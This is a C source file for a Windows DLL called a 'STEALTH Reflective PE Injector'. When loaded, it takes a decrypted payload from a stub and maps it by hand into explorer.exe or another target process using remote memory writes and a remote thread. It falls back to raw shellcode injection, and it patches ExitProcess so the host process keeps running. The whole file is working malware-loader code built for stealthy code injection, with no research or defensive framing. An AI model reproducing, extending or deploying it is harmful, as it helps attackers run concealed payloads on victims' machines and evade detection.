// STEALTH Reflective PE Injector
// Stage: PREINJECT
// Purpose: Inject PE into remote process with proper loading (relocations,
// imports)
//
// Flow:
// 1. Get decrypted PE from stub
// 2. Open target process (explorer.exe)
// 3. Allocate memory for PE + loader stub
// 4. Write loader stub + PE to remote process
// 5. Create remote thread running loader stub
// 6. Loader stub maps PE properly in remote process
// 7. Signal injection handled

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// Manually define PROCESSENTRY32
#define TH32CS_SNAPPROCESS 0x00000002

typedef struct tagPROCESSENTRY32 {
  DWORD dwSize;
  DWORD cntUsage;
  DWORD th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD th32ModuleID;
  DWORD cntThreads;
  DWORD th32ParentProcessID;
  LONG pcPriClassBase;
  DWORD dwFlags;
  CHAR szExeFile[260];
} PROCESSENTRY32, *LPPROCESSENTRY32;

typedef HANDLE(WINAPI *fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI *fnProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI *fnProcess32Next)(HANDLE, LPPROCESSENTRY32);

// Stub API types
typedef struct {
  void *data;
  size_t size;
  BOOL is_pe;
  BOOL in_memory_mode;
} StealthPayload;

typedef StealthPayload *(*pfnGetPayload)(void);
typedef void (*pfnSetInjectionHandled)(void);

static pfnGetPayload g_GetPayload = NULL;
static pfnSetInjectionHandled g_SetInjectionHandled = NULL;
static int g_debug = 0;
static char g_target_process[MAX_PATH] = "explorer.exe";

static void init_config() {
  char *debug = getenv("STEALTH_INJECTOR_DEBUG");
  g_debug = (debug && debug[0]);
  // MUST use GetEnvironmentVariableA, not getenv() - getenv uses C runtime
  // cache and doesn't see SetEnvironmentVariableA() changes made by stub
  char target[MAX_PATH] = {0};
  if (GetEnvironmentVariableA("STEALTH_INJECT_TARGET", target, MAX_PATH) > 0 &&
      target[0]) {
    strncpy(g_target_process, target, MAX_PATH - 1);
  }
}

static void log_msg(const char *msg) {
  if (!g_debug)
    return;
  char path[MAX_PATH];
  GetTempPathA(sizeof(path), path);
  strcat(path, "stealth_injector.log");
  FILE *f = fopen(path, "a");
  if (f) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] [REFLECTIVE] %s\n", st.wHour, st.wMinute,
            st.wSecond, msg);
    fclose(f);
  }
}

static BOOL ResolveStubExports(void) {
  HMODULE hStub = GetModuleHandleA(NULL);
  if (!hStub)
    return FALSE;
  g_GetPayload = (pfnGetPayload)GetProcAddress(hStub, "stealth_get_payload");
  g_SetInjectionHandled = (pfnSetInjectionHandled)GetProcAddress(
      hStub, "stealth_set_injection_handled");
  return (g_GetPayload != NULL);
}

static DWORD FindProcessByName(const char *processName) {
  HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
  if (!hKernel32)
    return 0;

  fnCreateToolhelp32Snapshot pCreateToolhelp32Snapshot =
      (fnCreateToolhelp32Snapshot)GetProcAddress(hKernel32,
                                                 "CreateToolhelp32Snapshot");
  fnProcess32First pProcess32First =
      (fnProcess32First)GetProcAddress(hKernel32, "Process32First");
  fnProcess32Next pProcess32Next =
      (fnProcess32Next)GetProcAddress(hKernel32, "Process32Next");

  if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next)
    return 0;

  HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE)
    return 0;

  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!pProcess32First(hSnapshot, &pe32)) {
    CloseHandle(hSnapshot);
    return 0;
  }

  DWORD pid = 0;
  do {
    if (_stricmp(pe32.szExeFile, processName) == 0) {
      pid = pe32.th32ProcessID;
      break;
    }
  } while (pProcess32Next(hSnapshot, &pe32));

  CloseHandle(hSnapshot);
  return pid;
}

// Reflective loader context - passed to remote thread
typedef struct {
  void *peBase;    // Where PE data is in remote memory
  size_t peSize;   // Size of PE data
  void *allocBase; // Base of allocated region
  DWORD imageSize; // Size needed for mapped image
  // Function pointers resolved locally, used remotely
  LPVOID pLoadLibraryA;
  LPVOID pGetProcAddress;
  LPVOID pVirtualAlloc;
  LPVOID pVirtualProtect;
  LPVOID pNtFlushInstructionCache;
  LPVOID pExitThread; // For graceful exit - redirect ExitProcess here
} ReflectiveContext;

// This is the reflective loader stub that runs in the remote process
// It must be position-independent and only use function pointers from context
// Note: This is simplified - production code would use more sophisticated
// techniques
static DWORD WINAPI ReflectiveLoader(ReflectiveContext *ctx) {
  typedef HMODULE(WINAPI * pLoadLibraryA_t)(LPCSTR);
  typedef FARPROC(WINAPI * pGetProcAddress_t)(HMODULE, LPCSTR);
  typedef LPVOID(WINAPI * pVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
  typedef BOOL(WINAPI * pVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);

  pLoadLibraryA_t fnLoadLibrary = (pLoadLibraryA_t)ctx->pLoadLibraryA;
  pGetProcAddress_t fnGetProcAddress = (pGetProcAddress_t)ctx->pGetProcAddress;
  pVirtualAlloc_t fnVirtualAlloc = (pVirtualAlloc_t)ctx->pVirtualAlloc;
  pVirtualProtect_t fnVirtualProtect = (pVirtualProtect_t)ctx->pVirtualProtect;

  unsigned char *peData = (unsigned char *)ctx->peBase;

  // Parse PE headers
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
  if (dosHeader->e_magic != 0x5A4D)
    return 1; // MZ check

  PIMAGE_NT_HEADERS ntHeaders =
      (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
  if (ntHeaders->Signature != 0x00004550)
    return 2; // PE\0\0 check

  // Allocate memory for the mapped image at preferred base or any available
  DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
  LPVOID imageBase =
      fnVirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, imageSize,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  if (!imageBase) {
    // Try anywhere
    imageBase = fnVirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
  }

  if (!imageBase)
    return 3;

  // Copy headers
  for (DWORD i = 0; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++) {
    ((unsigned char *)imageBase)[i] = peData[i];
  }

  // Copy sections
  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
  for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
    if (section[i].SizeOfRawData > 0) {
      unsigned char *dest =
          (unsigned char *)imageBase + section[i].VirtualAddress;
      unsigned char *src = peData + section[i].PointerToRawData;
      for (DWORD j = 0; j < section[i].SizeOfRawData; j++) {
        dest[j] = src[j];
      }
    }
  }

  // Apply relocations
  ULONGLONG delta = (ULONGLONG)imageBase - ntHeaders->OptionalHeader.ImageBase;
  if (delta != 0 &&
      ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
              .Size > 0) {
    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)((unsigned char *)imageBase +
                                 ntHeaders->OptionalHeader
                                     .DataDirectory
                                         [IMAGE_DIRECTORY_ENTRY_BASERELOC]
                                     .VirtualAddress);

    while (reloc->VirtualAddress) {
      DWORD numRelocs =
          (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
      WORD *relocData = (WORD *)(reloc + 1);

      for (DWORD i = 0; i < numRelocs; i++) {
        int type = relocData[i] >> 12;
        int offset = relocData[i] & 0xFFF;

        if (type == IMAGE_REL_BASED_DIR64) {
          ULONGLONG *addr = (ULONGLONG *)((unsigned char *)imageBase +
                                          reloc->VirtualAddress + offset);
          *addr += delta;
        } else if (type == IMAGE_REL_BASED_HIGHLOW) {
          DWORD *addr = (DWORD *)((unsigned char *)imageBase +
                                  reloc->VirtualAddress + offset);
          *addr += (DWORD)delta;
        }
      }
      reloc =
          (PIMAGE_BASE_RELOCATION)((unsigned char *)reloc + reloc->SizeOfBlock);
    }
  }

  // Resolve imports
  if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
          .Size > 0) {
    PIMAGE_IMPORT_DESCRIPTOR importDesc =
        (PIMAGE_IMPORT_DESCRIPTOR)((unsigned char *)imageBase +
                                   ntHeaders->OptionalHeader
                                       .DataDirectory
                                           [IMAGE_DIRECTORY_ENTRY_IMPORT]
                                       .VirtualAddress);

    while (importDesc->Name) {
      LPCSTR dllName = (LPCSTR)((unsigned char *)imageBase + importDesc->Name);
      HMODULE hDll = fnLoadLibrary(dllName);
      if (!hDll) {
        importDesc++;
        continue;
      }

      PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((unsigned char *)imageBase +
                                                    importDesc->FirstThunk);
      PIMAGE_THUNK_DATA origThunk =
          importDesc->OriginalFirstThunk
              ? (PIMAGE_THUNK_DATA)((unsigned char *)imageBase +
                                    importDesc->OriginalFirstThunk)
              : thunk;

      while (origThunk->u1.AddressOfData) {
        if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
          thunk->u1.Function = (ULONGLONG)fnGetProcAddress(
              hDll, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
        } else {
          PIMAGE_IMPORT_BY_NAME importByName =
              (PIMAGE_IMPORT_BY_NAME)((unsigned char *)imageBase +
                                      origThunk->u1.AddressOfData);
          thunk->u1.Function =
              (ULONGLONG)fnGetProcAddress(hDll, importByName->Name);
        }
        thunk++;
        origThunk++;
      }
      importDesc++;
    }
  }

  // Update NT headers with new image base
  PIMAGE_NT_HEADERS newNtHeaders =
      (PIMAGE_NT_HEADERS)((unsigned char *)imageBase + dosHeader->e_lfanew);
  newNtHeaders->OptionalHeader.ImageBase = (ULONGLONG)imageBase;

  // PATCH: Hook ExitProcess to call ExitThread instead
  // This prevents the payload from killing the host process
  if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
          .Size > 0) {
    PIMAGE_IMPORT_DESCRIPTOR patchImportDesc =
        (PIMAGE_IMPORT_DESCRIPTOR)((unsigned char *)imageBase +
                                   ntHeaders->OptionalHeader
                                       .DataDirectory
                                           [IMAGE_DIRECTORY_ENTRY_IMPORT]
                                       .VirtualAddress);

    while (patchImportDesc->Name) {
      PIMAGE_THUNK_DATA thunk =
          (PIMAGE_THUNK_DATA)((unsigned char *)imageBase +
                              patchImportDesc->FirstThunk);
      PIMAGE_THUNK_DATA origThunk =
          patchImportDesc->OriginalFirstThunk
              ? (PIMAGE_THUNK_DATA)((unsigned char *)imageBase +
                                    patchImportDesc->OriginalFirstThunk)
              : thunk;

      while (origThunk->u1.AddressOfData) {
        if (!(origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
          PIMAGE_IMPORT_BY_NAME importByName =
              (PIMAGE_IMPORT_BY_NAME)((unsigned char *)imageBase +
                                      origThunk->u1.AddressOfData);
          // Check if this is ExitProcess
          char exitProc[] = {'E', 'x', 'i', 't', 'P', 'r',
                             'o', 'c', 'e', 's', 's', 0};
          char *name = importByName->Name;
          int match = 1;
          for (int i = 0; exitProc[i] && match; i++) {
            if (name[i] != exitProc[i])
              match = 0;
          }
          if (match && name[11] == 0) {
            // Replace with ExitThread to avoid killing host
            thunk->u1.Function = (ULONGLONG)ctx->pExitThread;
          }
        }
        thunk++;
        origThunk++;
      }
      patchImportDesc++;
    }
  }

  // Call entry point
  typedef BOOL(WINAPI * DllMain_t)(HINSTANCE, DWORD, LPVOID);
  DllMain_t entryPoint =
      (DllMain_t)((unsigned char *)imageBase +
                  ntHeaders->OptionalHeader.AddressOfEntryPoint);

  // For EXE, call as WinMain-like; for DLL, call DllMain
  if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
    entryPoint((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, NULL);
  } else {
    // For EXE, call entry point directly - ExitProcess is hooked to ExitThread
    ((void (*)(void))entryPoint)();
  }

  return 0;
}

// Marker for end of loader code
static void ReflectiveLoaderEnd(void) {}

static BOOL InjectPEReflectively(DWORD targetPid, void *peData, size_t peSize) {
  char buf[256];
  sprintf(buf, "Reflective injection into PID %lu", (unsigned long)targetPid);
  log_msg(buf);

  // Open target process
  HANDLE hProcess =
      OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                      PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                  FALSE, targetPid);

  if (!hProcess) {
    sprintf(buf, "OpenProcess failed: %lu", GetLastError());
    log_msg(buf);
    return FALSE;
  }

  log_msg("Opened target process");

  // Calculate sizes
  size_t loaderSize =
      (size_t)((char *)ReflectiveLoaderEnd - (char *)ReflectiveLoader);
  size_t contextSize = sizeof(ReflectiveContext);
  size_t totalSize =
      loaderSize + contextSize + peSize + 0x1000; // Extra padding

  sprintf(buf, "Loader size: %zu, PE size: %zu, total: %zu", loaderSize, peSize,
          totalSize);
  log_msg(buf);

  // Allocate in remote process
  LPVOID remoteBase =
      VirtualAllocEx(hProcess, NULL, totalSize, MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE);
  if (!remoteBase) {
    sprintf(buf, "VirtualAllocEx failed: %lu", GetLastError());
    log_msg(buf);
    CloseHandle(hProcess);
    return FALSE;
  }

  sprintf(buf, "Remote allocation at %p", remoteBase);
  log_msg(buf);

  // Layout in remote memory:
  // [ReflectiveLoader code][ReflectiveContext][PE data]
  LPVOID remoteLoaderAddr = remoteBase;
  LPVOID remoteContextAddr = (char *)remoteBase + loaderSize + 64; // Align
  LPVOID remotePEAddr =
      (char *)remoteContextAddr + sizeof(ReflectiveContext) + 64;

  // Prepare context
  ReflectiveContext ctx = {0};
  ctx.peBase = remotePEAddr;
  ctx.peSize = peSize;
  ctx.allocBase = remoteBase;
  ctx.pLoadLibraryA =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
  ctx.pGetProcAddress = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                               "GetProcAddress");
  ctx.pVirtualAlloc =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
  ctx.pVirtualProtect = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                               "VirtualProtect");
  ctx.pNtFlushInstructionCache = (LPVOID)GetProcAddress(
      GetModuleHandleA("ntdll.dll"), "NtFlushInstructionCache");
  ctx.pExitThread =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");

  // Write loader code
  SIZE_T written;
  if (!WriteProcessMemory(hProcess, remoteLoaderAddr, ReflectiveLoader,
                          loaderSize, &written)) {
    sprintf(buf, "Failed to write loader: %lu", GetLastError());
    log_msg(buf);
    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
  }
  log_msg("Wrote loader code");

  // Write context
  if (!WriteProcessMemory(hProcess, remoteContextAddr, &ctx, sizeof(ctx),
                          &written)) {
    log_msg("Failed to write context");
    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
  }
  log_msg("Wrote context");

  // Write PE data
  if (!WriteProcessMemory(hProcess, remotePEAddr, peData, peSize, &written)) {
    log_msg("Failed to write PE");
    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
  }
  log_msg("Wrote PE data");

  // Create remote thread to run loader
  HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                      (LPTHREAD_START_ROUTINE)remoteLoaderAddr,
                                      remoteContextAddr, 0, NULL);

  if (!hThread) {
    sprintf(buf, "CreateRemoteThread failed: %lu", GetLastError());
    log_msg(buf);
    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
  }

  log_msg("Remote thread created - waiting");
  WaitForSingleObject(hThread, 5000);

  DWORD exitCode = 0;
  GetExitCodeThread(hThread, &exitCode);
  sprintf(buf, "Loader exit code: %lu", exitCode);
  log_msg(buf);

  CloseHandle(hThread);
  CloseHandle(hProcess);

  if (exitCode == 0 || exitCode == STILL_ACTIVE) {
    log_msg("SUCCESS: PE injected reflectively");
    return TRUE;
  }

  return FALSE;
}

static BOOL PerformInjection(void) {
  char buf[256];
  log_msg("=== Reflective PE Injector Starting ===");
  sprintf(buf, "Target: %s", g_target_process);
  log_msg(buf);

  if (!ResolveStubExports()) {
    log_msg("Failed to resolve stub exports");
    return FALSE;
  }

  StealthPayload *payload = g_GetPayload();
  if (!payload) {
    log_msg("No payload available");
    return FALSE;
  }

  sprintf(buf, "Payload: %zu bytes, is_pe=%d", payload->size, payload->is_pe);
  log_msg(buf);

  if (!payload->is_pe) {
    log_msg("Not a PE - using simple shellcode injection");
    // For shellcode, just allocate and execute
    DWORD targetPid = FindProcessByName(g_target_process);
    if (targetPid == 0)
      return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                      PROCESS_VM_WRITE | PROCESS_VM_READ,
                                  FALSE, targetPid);
    if (!hProcess)
      return FALSE;

    LPVOID remoteMem =
        VirtualAllocEx(hProcess, NULL, payload->size, MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
      CloseHandle(hProcess);
      return FALSE;
    }

    SIZE_T written;
    WriteProcessMemory(hProcess, remoteMem, payload->data, payload->size,
                       &written);

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (hThread) {
      WaitForSingleObject(hThread, 5000);
      CloseHandle(hThread);
      if (g_SetInjectionHandled)
        g_SetInjectionHandled();
      log_msg("Shellcode injected");
      CloseHandle(hProcess);
      return TRUE;
    }
    CloseHandle(hProcess);
    return FALSE;
  }

  // PE injection
  DWORD targetPid = FindProcessByName(g_target_process);
  if (targetPid == 0) {
    sprintf(buf, "Target '%s' not found", g_target_process);
    log_msg(buf);
    return FALSE;
  }

  sprintf(buf, "Target PID: %lu", (unsigned long)targetPid);
  log_msg(buf);

  if (InjectPEReflectively(targetPid, payload->data, payload->size)) {
    if (g_SetInjectionHandled) {
      g_SetInjectionHandled();
      log_msg("Signaled injection handled");
    }
    return TRUE;
  }

  return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hinstDLL);
    init_config();
    log_msg("Reflective PE Injector loaded");
    PerformInjection();
  }
  return TRUE;
}
